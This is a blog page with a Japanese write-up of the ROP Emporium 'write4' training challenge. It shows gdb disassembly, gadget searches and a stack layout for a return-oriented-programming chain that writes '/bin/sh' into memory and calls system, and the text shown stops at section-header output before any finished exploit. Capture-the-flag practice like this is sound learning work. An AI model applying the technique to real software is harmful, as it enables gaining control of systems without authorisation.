<!DOCTYPE html>
<html lang="en-us">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    
    <title>[writeup] ROP Emporium (3) Write4 | tamaron</title>
    <meta name="viewport" content="width=device-width,minimum-scale=1">
    <meta name="description" content="">
    <meta name="generator" content="Hugo 0.79.1" />
    
    
    
    
      <meta name="robots" content="noindex, nofollow">
    

    
<link rel="stylesheet" href="/ananke/css/main.min.css" >



  

    
    
    
      

    

    
    
    <meta property="og:title" content="[writeup] ROP Emporium (3) Write4" />
<meta property="og:description" content="" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://www.tamaron.dev/post/2020-03-30/" />
<meta property="article:published_time" content="2020-03-30T00:00:00+09:00" />
<meta property="article:modified_time" content="2020-03-30T00:00:00+09:00" /><meta property="og:site_name" content="tamaron" />
<meta itemprop="name" content="[writeup] ROP Emporium (3) Write4">
<meta itemprop="description" content="">
<meta itemprop="datePublished" content="2020-03-30T00:00:00+09:00" />
<meta itemprop="dateModified" content="2020-03-30T00:00:00+09:00" />
<meta itemprop="wordCount" content="1095">



<meta itemprop="keywords" content="CTF," />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="[writeup] ROP Emporium (3) Write4"/>
<meta name="twitter:description" content=""/>

	
  </head>

  <body class="ma0 avenir bg-near-white">

    
   
  

  <header>
    <div class="bg-black">
      <nav class="pv3 ph3 ph4-ns" role="navigation">
  <div class="flex-l justify-between items-center center">
    <a href="/" class="f3 fw2 hover-white no-underline white-90 dib">
      
        tamaron
      
    </a>
    <div class="flex-l items-center">
      

      
        <ul class="pl0 mr3">
          
          <li class="list f5 f4-ns fw4 dib pr3">
            <a class="hover-white no-underline white-90" href="/about/" title="About page">
              About
            </a>
          </li>
          
          <li class="list f5 f4-ns fw4 dib pr3">
            <a class="hover-white no-underline white-90" href="/post/" title="Post page">
              Post
            </a>
          </li>
          
          <li class="list f5 f4-ns fw4 dib pr3">
            <a class="hover-white no-underline white-90" href="/contact/" title="Contact page">
              Contact
            </a>
          </li>
          
        </ul>
      
      
<div class="ananke-socials">
  
    
    <a href="https://twitter.com/tamaroning" target="_blank" rel="noopener" class="twitter ananke-social-link link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="Twitter link" aria-label="follow on Twitter——Opens in a new window">
      
        <span class="icon"><svg style="enable-background:new 0 0 67 67;" version="1.1" viewBox="0 0 67 67"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167,22.283c-2.619,0.953-4.274,3.411-4.086,6.101  l0.063,1.038l-1.048-0.127c-3.813-0.487-7.145-2.139-9.974-4.915l-1.383-1.377l-0.356,1.017c-0.754,2.267-0.272,4.661,1.299,6.271  c0.838,0.89,0.649,1.017-0.796,0.487c-0.503-0.169-0.943-0.296-0.985-0.233c-0.146,0.149,0.356,2.076,0.754,2.839  c0.545,1.06,1.655,2.097,2.871,2.712l1.027,0.487l-1.215,0.021c-1.173,0-1.215,0.021-1.089,0.467  c0.419,1.377,2.074,2.839,3.918,3.475l1.299,0.444l-1.131,0.678c-1.676,0.976-3.646,1.526-5.616,1.568  C19.775,43.256,19,43.341,19,43.405c0,0.211,2.557,1.397,4.044,1.864c4.463,1.377,9.765,0.783,13.746-1.568  c2.829-1.673,5.657-5,6.978-8.221c0.713-1.716,1.425-4.851,1.425-6.354c0-0.975,0.063-1.102,1.236-2.267  c0.692-0.678,1.341-1.419,1.467-1.631c0.21-0.403,0.188-0.403-0.88-0.043c-1.781,0.636-2.033,0.551-1.152-0.402  c0.649-0.678,1.425-1.907,1.425-2.267c0-0.063-0.314,0.042-0.671,0.233c-0.377,0.212-1.215,0.53-1.844,0.72l-1.131,0.361l-1.027-0.7  c-0.566-0.381-1.361-0.805-1.781-0.932C39.766,21.902,38.131,21.944,37.167,22.283z M33,64C16.432,64,3,50.569,3,34S16.432,4,33,4  s30,13.431,30,30S49.568,64,33,64z" style="fill-rule:evenodd;clip-rule:evenodd;"/></svg>
</span>
      
<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;"/>
</svg>
</span></a>
  
    
    <a href="https://github.com/tamaroning" target="_blank" rel="noopener" class="github ananke-social-link link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="GitHub link" aria-label="follow on GitHub——Opens in a new window">
      
        <span class="icon"><svg style="enable-background:new 0 0 512 512;" version="1.1" viewBox="0 0 512 512"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
  <path d="M256,32C132.3,32,32,134.8,32,261.7c0,101.5,64.2,187.5,153.2,217.9c11.2,2.1,15.3-5,15.3-11.1   c0-5.5-0.2-19.9-0.3-39.1c-62.3,13.9-75.5-30.8-75.5-30.8c-10.2-26.5-24.9-33.6-24.9-33.6c-20.3-14.3,1.5-14,1.5-14   c22.5,1.6,34.3,23.7,34.3,23.7c20,35.1,52.4,25,65.2,19.1c2-14.8,7.8-25,14.2-30.7c-49.7-5.8-102-25.5-102-113.5   c0-25.1,8.7-45.6,23-61.6c-2.3-5.8-10-29.2,2.2-60.8c0,0,18.8-6.2,61.6,23.5c17.9-5.1,37-7.6,56.1-7.7c19,0.1,38.2,2.6,56.1,7.7   c42.8-29.7,61.5-23.5,61.5-23.5c12.2,31.6,4.5,55,2.2,60.8c14.3,16.1,23,36.6,23,61.6c0,88.2-52.4,107.6-102.3,113.3   c8,7.1,15.2,21.1,15.2,42.5c0,30.7-0.3,55.5-0.3,63c0,6.1,4,13.3,15.4,11C415.9,449.1,480,363.1,480,261.7   C480,134.8,379.7,32,256,32z"/>
</svg>
</span>
      
<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;"/>
</svg>
</span></a>
  
</div>

    </div>
  </div>
</nav>

    </div>
  </header>



    <main class="pb7" role="main">
      
  
  <article class="flex-l flex-wrap justify-between mw8 center ph3">
    <header class="mt4 w-100">
      <aside class="instapaper_ignoref b helvetica tracked">
          
        POST
      </aside>
      










  <div id="sharing" class="mt3 ananke-socials">
    
      
      <a href="https://twitter.com/share?url=https://www.tamaron.dev/post/2020-03-30/&amp;text=[writeup]%20ROP%20Emporium%20%283%29%20Write4" class="ananke-social-link twitter no-underline" aria-label="share on Twitter">
        
        <span class="icon"> <svg style="enable-background:new 0 0 67 67;" version="1.1" viewBox="0 0 67 67"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167,22.283c-2.619,0.953-4.274,3.411-4.086,6.101  l0.063,1.038l-1.048-0.127c-3.813-0.487-7.145-2.139-9.974-4.915l-1.383-1.377l-0.356,1.017c-0.754,2.267-0.272,4.661,1.299,6.271  c0.838,0.89,0.649,1.017-0.796,0.487c-0.503-0.169-0.943-0.296-0.985-0.233c-0.146,0.149,0.356,2.076,0.754,2.839  c0.545,1.06,1.655,2.097,2.871,2.712l1.027,0.487l-1.215,0.021c-1.173,0-1.215,0.021-1.089,0.467  c0.419,1.377,2.074,2.839,3.918,3.475l1.299,0.444l-1.131,0.678c-1.676,0.976-3.646,1.526-5.616,1.568  C19.775,43.256,19,43.341,19,43.405c0,0.211,2.557,1.397,4.044,1.864c4.463,1.377,9.765,0.783,13.746-1.568  c2.829-1.673,5.657-5,6.978-8.221c0.713-1.716,1.425-4.851,1.425-6.354c0-0.975,0.063-1.102,1.236-2.267  c0.692-0.678,1.341-1.419,1.467-1.631c0.21-0.403,0.188-0.403-0.88-0.043c-1.781,0.636-2.033,0.551-1.152-0.402  c0.649-0.678,1.425-1.907,1.425-2.267c0-0.063-0.314,0.042-0.671,0.233c-0.377,0.212-1.215,0.53-1.844,0.72l-1.131,0.361l-1.027-0.7  c-0.566-0.381-1.361-0.805-1.781-0.932C39.766,21.902,38.131,21.944,37.167,22.283z M33,64C16.432,64,3,50.569,3,34S16.432,4,33,4  s30,13.431,30,30S49.568,64,33,64z" style="fill-rule:evenodd;clip-rule:evenodd;"/></svg>
</span>
        
      </a>
    
  </div>


      <h1 class="f1 athelas mt3 mb1">[writeup] ROP Emporium (3) Write4</h1>
      
      
      
      <time class="f6 mv4 dib tracked" datetime="2020-03-30T00:00:00+09:00">March 30, 2020</time>
      

      
      
    </header>
    <div class="nested-copy-line-height lh-copy serif f4 nested-links mid-gray pr4-l w-two-thirds-l"><ul>
<li>問題リンク
[https://ropemporium.com/challenge/write4.html:embed:cite]</li>
</ul>
<p>まず<code>strings</code>コマンドで表層解析をする</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ strings write432
...
/bin/ls
...
</code></pre></div><p>プログラム内部でsystem()を呼び出していそうなことがわかる</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ gdb write432
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
gdb-peda$ i func
All defined functions:

Non-debugging symbols:
0x080483c0  _init
0x08048400  printf@plt
0x08048410  fgets@plt
0x08048420  puts@plt
**0x08048430  system@plt**
0x08048440  __libc_start_main@plt
0x08048450  setvbuf@plt
0x08048460  memset@plt
0x08048470  __gmon_start__@plt
0x08048480  _start
0x080484b0  __x86.get_pc_thunk.bx
0x080484c0  deregister_tm_clones
0x080484f0  register_tm_clones
0x08048530  __do_global_dtors_aux
0x08048550  frame_dummy
0x0804857b  main
0x080485f6  pwnme
0x0804864c  usefulFunction
0x08048670  usefulGadgets
0x08048680  __libc_csu_init
0x080486e0  __libc_csu_fini
0x080486e4  _fini
gdb-peda$ 
</code></pre></div><p>partial RERLOなのでGOT Overwriteが可能であり、NX bitがonなのでshellcodeによるexploitはできない。
((0)~(2)と同様BoFによってEIPが奪えるなのでGot Overwriteの必要はないが&hellip;)<!-- raw HTML omitted -->
またpwnme、usefulFunction、usefulGadgetsをそれぞれディスアセンブルしてみる。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">gdb-peda$ pdisas main
Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> main:
   0x0804857b &lt;+0&gt;:     lea    ecx,<span style="color:#f92672">[</span>esp+0x4<span style="color:#f92672">]</span>
   0x0804857f &lt;+4&gt;:     and    esp,0xfffffff0
   0x08048582 &lt;+7&gt;:     push   DWORD PTR <span style="color:#f92672">[</span>ecx-0x4<span style="color:#f92672">]</span>
   0x08048585 &lt;+10&gt;:    push   ebp
   0x08048586 &lt;+11&gt;:    mov    ebp,esp
   0x08048588 &lt;+13&gt;:    push   ecx
   0x08048589 &lt;+14&gt;:    sub    esp,0x4
   0x0804858c &lt;+17&gt;:    mov    eax,ds:0x804a064
   0x08048591 &lt;+22&gt;:    push   0x0
   0x08048593 &lt;+24&gt;:    push   0x2
   0x08048595 &lt;+26&gt;:    push   0x0
   0x08048597 &lt;+28&gt;:    push   eax
   0x08048598 &lt;+29&gt;:    call   0x8048450 &lt;setvbuf@plt&gt;
   0x0804859d &lt;+34&gt;:    add    esp,0x10
   0x080485a0 &lt;+37&gt;:    mov    eax,ds:0x804a040
   0x080485a5 &lt;+42&gt;:    push   0x0
   0x080485a7 &lt;+44&gt;:    push   0x2
   0x080485a9 &lt;+46&gt;:    push   0x0
   0x080485ab &lt;+48&gt;:    push   eax
   0x080485ac &lt;+49&gt;:    call   0x8048450 &lt;setvbuf@plt&gt;
   0x080485b1 &lt;+54&gt;:    add    esp,0x10
   0x080485b4 &lt;+57&gt;:    sub    esp,0xc
   0x080485b7 &lt;+60&gt;:    push   0x8048700
   0x080485bc &lt;+65&gt;:    call   0x8048420 &lt;puts@plt&gt;
   0x080485c1 &lt;+70&gt;:    add    esp,0x10
   0x080485c4 &lt;+73&gt;:    sub    esp,0xc
   0x080485c7 &lt;+76&gt;:    push   0x8048717
   0x080485cc &lt;+81&gt;:    call   0x8048420 &lt;puts@plt&gt;
   0x080485d1 &lt;+86&gt;:    add    esp,0x10
   0x080485d4 &lt;+89&gt;:    call   0x80485f6 &lt;pwnme&gt;
   0x080485d9 &lt;+94&gt;:    sub    esp,0xc
   0x080485dc &lt;+97&gt;:    push   0x804871f
   0x080485e1 &lt;+102&gt;:   call   0x8048420 &lt;puts@plt&gt;
   0x080485e6 &lt;+107&gt;:   add    esp,0x10
   0x080485e9 &lt;+110&gt;:   mov    eax,0x0
   0x080485ee &lt;+115&gt;:   mov    ecx,DWORD PTR <span style="color:#f92672">[</span>ebp-0x4<span style="color:#f92672">]</span>
   0x080485f1 &lt;+118&gt;:   leave  
   0x080485f2 &lt;+119&gt;:   lea    esp,<span style="color:#f92672">[</span>ecx-0x4<span style="color:#f92672">]</span>
   0x080485f5 &lt;+122&gt;:   ret    
End of assembler dump.
gdb-peda$ pdisas pwnme
Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> pwnme:
   0x080485f6 &lt;+0&gt;:     push   ebp
   0x080485f7 &lt;+1&gt;:     mov    ebp,esp
   0x080485f9 &lt;+3&gt;:     sub    esp,0x28
   0x080485fc &lt;+6&gt;:     sub    esp,0x4
   0x080485ff &lt;+9&gt;:     push   0x20
   0x08048601 &lt;+11&gt;:    push   0x0
   0x08048603 &lt;+13&gt;:    lea    eax,<span style="color:#f92672">[</span>ebp-0x28<span style="color:#f92672">]</span>
   0x08048606 &lt;+16&gt;:    push   eax
   0x08048607 &lt;+17&gt;:    call   0x8048460 &lt;memset@plt&gt;
   0x0804860c &lt;+22&gt;:    add    esp,0x10
   0x0804860f &lt;+25&gt;:    sub    esp,0xc
   0x08048612 &lt;+28&gt;:    push   0x8048728
   0x08048617 &lt;+33&gt;:    call   0x8048420 &lt;puts@plt&gt;
   0x0804861c &lt;+38&gt;:    add    esp,0x10
   0x0804861f &lt;+41&gt;:    sub    esp,0xc
   0x08048622 &lt;+44&gt;:    push   0x8048751
   0x08048627 &lt;+49&gt;:    call   0x8048400 &lt;printf@plt&gt;
   0x0804862c &lt;+54&gt;:    add    esp,0x10
   0x0804862f &lt;+57&gt;:    mov    eax,ds:0x804a060
   0x08048634 &lt;+62&gt;:    sub    esp,0x4
   0x08048637 &lt;+65&gt;:    push   eax
   0x08048638 &lt;+66&gt;:    push   0x200
   0x0804863d &lt;+71&gt;:    lea    eax,<span style="color:#f92672">[</span>ebp-0x28<span style="color:#f92672">]</span>
   0x08048640 &lt;+74&gt;:    push   eax
   0x08048641 &lt;+75&gt;:    call   0x8048410 &lt;fgets@plt&gt;
   0x08048646 &lt;+80&gt;:    add    esp,0x10
   0x08048649 &lt;+83&gt;:    nop
   0x0804864a &lt;+84&gt;:    leave  
   0x0804864b &lt;+85&gt;:    ret    
End of assembler dump.
</code></pre></div><p>次にusefulFunctionを見る。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> usefulFunction:
   0x0804864c &lt;+0&gt;:     push   ebp
   0x0804864d &lt;+1&gt;:     mov    ebp,esp
   0x0804864f &lt;+3&gt;:     sub    esp,0x8
   0x08048652 &lt;+6&gt;:     sub    esp,0xc
   0x08048655 &lt;+9&gt;:     push   0x8048754
   0x0804865a &lt;+14&gt;:    call   0x8048430 &lt;system@plt&gt;
   0x0804865f &lt;+19&gt;:    add    esp,0x10
   0x08048662 &lt;+22&gt;:    nop
   0x08048663 &lt;+23&gt;:    leave  
   0x08048664 &lt;+24&gt;:    ret    
End of assembler dump.
gdb-peda$ x/s 0x8048754
0x8048754:      <span style="color:#e6db74">&#34;/bin/ls&#34;</span>
gdb-peda$ 
</code></pre></div><p>systemを呼び出しているが、その引数は<code>/bin/ls</code>となっており、bashを起動するには一工夫必要そうだ。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">gdb-peda$ pdisas usefulGadgets
Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> usefulGadgets:
   0x08048670 &lt;+0&gt;:     mov    DWORD PTR <span style="color:#f92672">[</span>edi<span style="color:#f92672">]</span>,ebp
   0x08048672 &lt;+2&gt;:     ret    
   0x08048673 &lt;+3&gt;:     xchg   ax,ax
   0x08048675 &lt;+5&gt;:     xchg   ax,ax
   0x08048677 &lt;+7&gt;:     xchg   ax,ax
   0x08048679 &lt;+9&gt;:     xchg   ax,ax
   0x0804867b &lt;+11&gt;:    xchg   ax,ax
   0x0804867d &lt;+13&gt;:    xchg   ax,ax
   0x0804867f &lt;+15&gt;:    nop
End of assembler dump.
gdb-peda$ 
</code></pre></div><p>usefulGadgetsの<code>mov DWORD PTR [edi],ebp; ret</code>というガジェットが使えることがわかる。<!-- raw HTML omitted -->
これはediの指すメモリアドレスにebpの値をコピーする命令となっていて、これを使ってwritableなメモリ領域に<code>/bin/sh</code>と書き込み、systemの引数としてbashの起動をすることを目指す。</p>
<p>そのためには<code>pop edi</code> <code>pop ebp</code>などのstackからedi、ebpレジスタを操作する命令群がほしい。
これらを<code>ropgadget</code>コマンドで探してみる。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">gdb-peda$ start
gdb-peda$ ropgadget
ret <span style="color:#f92672">=</span> 0x804819d
popret <span style="color:#f92672">=</span> 0x80483e1
pop2ret <span style="color:#f92672">=</span> 0x80486da
pop3ret <span style="color:#f92672">=</span> 0x80486d9
pop4ret <span style="color:#f92672">=</span> 0x80486d8
addesp_12 <span style="color:#f92672">=</span> 0x80483de
addesp_16 <span style="color:#f92672">=</span> 0x80484e5
gdb-peda$ x/3i 0x80486da
   0x80486da &lt;__libc_csu_init+90&gt;:      pop    edi
   0x80486db &lt;__libc_csu_init+91&gt;:      pop    ebp
   0x80486dc &lt;__libc_csu_init+92&gt;:      ret    
gdb-peda$ 
</code></pre></div><p>ちょうどpop2retでedi、ebpに値をpopできるのでこれを使う。</p>
<p>以下のスタックの状態を考えてみる。</p>
<table>
<thead>
<tr>
<th style="text-align:left">Low (↑stack growth)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">&hellip;</td>
</tr>
<tr>
<td style="text-align:left">pop edi;pop ebp;ret (=1番目の戻り先)</td>
</tr>
<tr>
<td style="text-align:left">書き込みたいアドレス (→edi)</td>
</tr>
<tr>
<td style="text-align:left">value　(4bit) (→ebp)</td>
</tr>
<tr>
<td style="text-align:left">mov [edi],ebp;ret (=2番目の戻り先)</td>
</tr>
<tr>
<td style="text-align:left">3番目の戻り先</td>
</tr>
<tr>
<td style="text-align:left">&hellip;</td>
</tr>
<tr>
<td style="text-align:left">High</td>
</tr>
</tbody>
</table>
<p>3番目の戻り先に再び<code>pop edi;pop ebp;ret</code>を接続することで、任意のメモリアドレスに任意の値の書き込みが可能になる。
次に<code>/bin/sh</code>を書き込むこむことができるセクションを探してみる。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ readelf -S write432
There are <span style="color:#ae81ff">31</span> section headers, starting at offset 0x196c:

セクションヘッダ:
  <span style="color:#f92672">[</span>番<span style="color:#f92672">]</span> 名前              タイプ          アドレス Off    サイズ ES Flg Lk Inf Al
  <span style="color:#f92672">[</span> 0<span style="color:#f92672">]</span>                   NULL            <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">000000</span> <span style="color:#ae81ff">000000</span> <span style="color:#ae81ff">00</span>      <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>
  <span style="color:#f92672">[</span> 1<span style="color:#f92672">]</span> .interp           PROGBITS        <span style="color:#ae81ff">08048154</span> <span style="color:#ae81ff">000154</span> <span style="color:#ae81ff">000013</span> <span style="color:#ae81ff">00</span>   A  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">1</span>
  <span style="color:#f92672">[</span> 2<span style="color:#f92672">]</span> .note.ABI-tag     NOTE            <span style="color:#ae81ff">08048168</span> <span style="color:#ae81ff">000168</span> <span style="color:#ae81ff">000020</span> <span style="color:#ae81ff">00</span>   A  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">4</span>
  <span style="color:#f92672">[</span> 3<span style="color:#f92672">]</span> .note.gnu.build-i NOTE            <span style="color:#ae81ff">08048188</span> <span style="color:#ae81ff">000188</span> <span style="color:#ae81ff">000024</span> <span style="color:#ae81ff">00</span>   A  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">4</span>
  <span style="color:#f92672">[</span> 4<span style="color:#f92672">]</span> .gnu.hash         GNU_HASH        080481ac 0001ac <span style="color:#ae81ff">000030</span> <span style="color:#ae81ff">04</span>   A  <span style="color:#ae81ff">5</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">4</span>
  <span style="color:#f92672">[</span> 5<span style="color:#f92672">]</span> .dynsym           DYNSYM          080481dc 0001dc 0000d0 <span style="color:#ae81ff">10</span>   A  <span style="color:#ae81ff">6</span>   <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">4</span>
  <span style="color:#f92672">[</span> 6<span style="color:#f92672">]</span> .dynstr           STRTAB          080482ac 0002ac <span style="color:#ae81ff">000081</span> <span style="color:#ae81ff">00</span>   A  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">1</span>
  <span style="color:#f92672">[</span> 7<span style="color:#f92672">]</span> .gnu.version      VERSYM          0804832e 00032e 00001a <span style="color:#ae81ff">02</span>   A  <span style="color:#ae81ff">5</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">2</span>
  <span style="color:#f92672">[</span> 8<span style="color:#f92672">]</span> .gnu.version_r    VERNEED         <span style="color:#ae81ff">08048348</span> <span style="color:#ae81ff">000348</span> <span style="color:#ae81ff">000020</span> <span style="color:#ae81ff">00</span>   A  <span style="color:#ae81ff">6</span>   <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">4</span>
  <span style="color:#f92672">[</span> 9<span style="color:#f92672">]</span> .rel.dyn          REL             <span style="color:#ae81ff">08048368</span> <span style="color:#ae81ff">000368</span> <span style="color:#ae81ff">000020</span> <span style="color:#ae81ff">08</span>   A  <span style="color:#ae81ff">5</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">4</span>
  <span style="color:#f92672">[</span>10<span style="color:#f92672">]</span> .rel.plt          REL             <span style="color:#ae81ff">08048388</span> <span style="color:#ae81ff">000388</span> <span style="color:#ae81ff">000038</span> <span style="color:#ae81ff">08</span>  AI  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">4</span>
  <span style="color:#f92672">[</span>11<span style="color:#f92672">]</span> .init             PROGBITS        080483c0 0003c0 <span style="color:#ae81ff">000023</span> <span style="color:#ae81ff">00</span>  AX  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">4</span>
  <span style="color:#f92672">[</span>12<span style="color:#f92672">]</span> .plt              PROGBITS        080483f0 0003f0 <span style="color:#ae81ff">000080</span> <span style="color:#ae81ff">04</span>  AX  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">16</span>
  <span style="color:#f92672">[</span>13<span style="color:#f92672">]</span> .plt.got          PROGBITS        <span style="color:#ae81ff">08048470</span> <span style="color:#ae81ff">000470</span> <span style="color:#ae81ff">000008</span> <span style="color:#ae81ff">00</span>  AX  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">8</span>
  <span style="color:#f92672">[</span>14<span style="color:#f92672">]</span> .text             PROGBITS        <span style="color:#ae81ff">08048480</span> <span style="color:#ae81ff">000480</span> <span style="color:#ae81ff">000262</span> <span style="color:#ae81ff">00</span>  AX  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">16</span>
  <span style="color:#f92672">[</span>15<span style="color:#f92672">]</span> .fini             PROGBITS        080486e4 0006e4 <span style="color:#ae81ff">000014</span> <span style="color:#ae81ff">00</span>  AX  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">4</span>
  <span style="color:#f92672">[</span>16<span style="color:#f92672">]</span> .rodata           PROGBITS        080486f8 0006f8 <span style="color:#ae81ff">000064</span> <span style="color:#ae81ff">00</span>   A  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">4</span>
  <span style="color:#f92672">[</span>17<span style="color:#f92672">]</span> .eh_frame_hdr     PROGBITS        0804875c 00075c 00003c <span style="color:#ae81ff">00</span>   A  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">4</span>
  <span style="color:#f92672">[</span>18<span style="color:#f92672">]</span> .eh_frame         PROGBITS        <span style="color:#ae81ff">08048798</span> <span style="color:#ae81ff">000798</span> 00010c <span style="color:#ae81ff">00</span>   A  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">4</span>
  <span style="color:#f92672">[</span>19<span style="color:#f92672">]</span> .init_array       INIT_ARRAY      08049f08 000f08 <span style="color:#ae81ff">000004</span> <span style="color:#ae81ff">00</span>  WA  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">4</span>
  <span style="color:#f92672">[</span>20<span style="color:#f92672">]</span> .fini_array       FINI_ARRAY      08049f0c 000f0c <span style="color:#ae81ff">000004</span> <span style="color:#ae81ff">00</span>  WA  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">4</span>
  <span style="color:#f92672">[</span>21<span style="color:#f92672">]</span> .jcr              PROGBITS        08049f10 000f10 <span style="color:#ae81ff">000004</span> <span style="color:#ae81ff">00</span>  WA  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">4</span>
  <span style="color:#f92672">[</span>22<span style="color:#f92672">]</span> .dynamic          DYNAMIC         08049f14 000f14 0000e8 <span style="color:#ae81ff">08</span>  WA  <span style="color:#ae81ff">6</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">4</span>
  <span style="color:#f92672">[</span>23<span style="color:#f92672">]</span> .got              PROGBITS        08049ffc 000ffc <span style="color:#ae81ff">000004</span> <span style="color:#ae81ff">04</span>  WA  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">4</span>
  <span style="color:#f92672">[</span>24<span style="color:#f92672">]</span> .got.plt          PROGBITS        0804a000 <span style="color:#ae81ff">001000</span> <span style="color:#ae81ff">000028</span> <span style="color:#ae81ff">04</span>  WA  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">4</span>
  <span style="color:#f92672">[</span>25<span style="color:#f92672">]</span> .data             PROGBITS        0804a028 <span style="color:#ae81ff">001028</span> <span style="color:#ae81ff">000008</span> <span style="color:#ae81ff">00</span>  WA  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">4</span>
  <span style="color:#f92672">[</span>26<span style="color:#f92672">]</span> .bss              NOBITS          0804a040 <span style="color:#ae81ff">001030</span> 00002c <span style="color:#ae81ff">00</span>  WA  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">32</span>
  <span style="color:#f92672">[</span>27<span style="color:#f92672">]</span> .comment          PROGBITS        <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">001030</span> <span style="color:#ae81ff">000034</span> <span style="color:#ae81ff">01</span>  MS  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">1</span>
  <span style="color:#f92672">[</span>28<span style="color:#f92672">]</span> .shstrtab         STRTAB          <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">001861</span> 00010a <span style="color:#ae81ff">00</span>      <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">1</span>
